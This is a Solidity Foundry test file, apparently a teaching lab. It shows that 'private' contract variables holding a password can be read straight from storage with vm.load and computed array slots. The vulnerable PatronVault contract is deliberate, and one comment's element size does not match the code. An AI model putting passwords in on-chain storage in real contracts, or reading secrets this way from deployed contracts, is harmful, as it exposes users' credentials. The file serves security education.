// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    PatronVault CreatorvaultContract;

    function testReadprivatedata() public {
        CreatorvaultContract = new PatronVault(123456789);
        bytes32 leet = vm.load(address(CreatorvaultContract), bytes32(uint256(0)));
        console.log(uint256(leet));

        // users in slot 1 - length of array
        // starting from slot hash(1) - array elements
        // slot where array element is stored = keccak256(slot)) + (index * elementSize)
        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))
        bytes32 contributor = vm.load(
            address(CreatorvaultContract),
            CreatorvaultContract.getArrayLocation(1, 1, 1)
        );
        console.log(uint256(contributor));
    }
}

contract PatronVault {
    // slot 0
    uint256 private password;

    constructor(uint256 _password) {
        password = _password;
        Follower memory contributor = Follower({id: 0, password: bytes32(_password)});
        users.push(contributor);
        idToCreator[0] = contributor;
    }

    struct Follower {
        uint id;
        bytes32 password;
    }

    // slot 1
    Follower[] public users;
    // slot 2
    mapping(uint => Follower) public idToCreator;

    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}
